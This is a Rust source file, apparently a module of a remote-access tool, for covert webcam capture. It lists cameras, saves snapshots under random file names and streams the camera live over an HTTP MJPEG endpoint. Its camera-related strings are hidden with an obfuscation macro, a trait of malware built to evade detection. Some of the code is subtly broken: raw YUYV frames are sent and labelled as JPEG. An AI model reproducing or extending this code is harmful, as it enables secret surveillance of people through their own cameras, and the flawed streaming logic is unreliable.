
use anyhow::{Result, Context, bail};
use nokhwa::{Camera};
use nokhwa::utils::CameraFormat;
use nokhwa::utils::FrameFormat;
use nokhwa::utils::CameraIndex::Index;
use nokhwa::utils::RequestedFormat;
use nokhwa::pixel_format::RgbFormat;
use nokhwa::utils::RequestedFormatType;
use nokhwa::pixel_format::YuyvFormat;
use tokio::sync::mpsc;
use bytes::{Bytes, BufMut, BytesMut};
use async_stream;
use axum::{response::Response, body::Body};
use nokhwa::utils::ApiBackend::Auto;

use crate::modules::random;
use crate::obfuscate;

pub fn snap(i: &str) -> Result<String> {
    
    nokhwa::nokhwa_initialize(|_| {});
    let mut cams = nokhwa::query(Auto)?;
    if cams.len() == 0 {
        bail!(obfuscate!("No cameras found!"));
    }
    let num: u32 = i.parse()?;
    let requested = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestResolution);
    let mut camera = Camera::new(Index(num), requested)?;
    camera.open_stream()?;

    let name = format!("{}.png", random::random_name());
    let frame = camera.frame()?;
    let image = frame.decode_image::<RgbFormat>()?;

    camera.stop_stream()?;
	/*
    drop(camera);
    Dropping the camera object triggers a STATUS_ACCESS_VIOLATION error causing the program to crash.
    Leaking it is good workaround for now;
    */
    std::mem::forget(camera); 
    
    image.save(&name)?;
    Ok(name)
}

pub async fn list() -> Result<String> {
    let mut list = String::new();
    let cams = nokhwa::query(Auto)?;
    list += &format!("{} {}", cams.len(), &obfuscate!("Cameras found!"));

    for (index, info) in cams.iter().enumerate() {
        list += &format!("\n{index} - {:?}", info.human_name());
    }
    Ok(list)
}

pub fn stream(tx: mpsc::Sender<Bytes>) -> Result<()> {
    
    nokhwa::nokhwa_initialize(|_| {});
    // Request Yuyv format which is easier to stream :)
    let requested = RequestedFormat::new::<YuyvFormat>(RequestedFormatType::AbsoluteHighestFrameRate);
    let mut camera = Camera::new(Index(0), requested)?;
    camera.open_stream()?;

    loop {
        let frame = match camera.frame() {
            Ok(frame) => frame,
            Err(e) => {
                std::thread::sleep(std::time::Duration::from_millis(10));
                continue;
                }
            };

            let frame_data = frame.buffer();
            let jpeg_bytes = Bytes::copy_from_slice(&frame_data);

            if tx.blocking_send(jpeg_bytes).is_err() {
                camera.stop_stream()?;
                drop(camera);
                //std::mem::forget(camera); 
                bail!("Stream ended!");
            }

            std::thread::sleep(std::time::Duration::from_millis(10));
    }

    Ok(())
}

pub async fn stream_handler() -> Response {
    
    let (tx, mut rx) = mpsc::channel::<Bytes>(10);
    std::thread::spawn(move || {stream(tx)});
    
    // Create MJPEG stream from received JPEGs
    let stream = async_stream::stream! {
        while let Some(jpeg) = rx.recv().await {
            let mut frame = BytesMut::new();
            frame.extend_from_slice(b"--frame\r\n");
            frame.extend_from_slice(b"Content-Type: image/jpeg\r\n");
            frame.extend_from_slice(b"Content-Length: ");
            frame.extend_from_slice(jpeg.len().to_string().as_bytes());
            frame.extend_from_slice(b"\r\n\r\n");
            frame.extend_from_slice(&jpeg);
            frame.extend_from_slice(b"\r\n");
            
            yield Ok::<_, std::convert::Infallible>(frame.freeze());
        }
    };
    
    // Return the HTTP response
    Response::builder()
            // parse as a multipart stream 
        .header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
            // prevent caching
        .header("Cache-Control", "no-cache, no-store, must-revalidate")
        .body(Body::from_stream(stream))
        .expect("Failed to create a reponse! Error: {}")

}
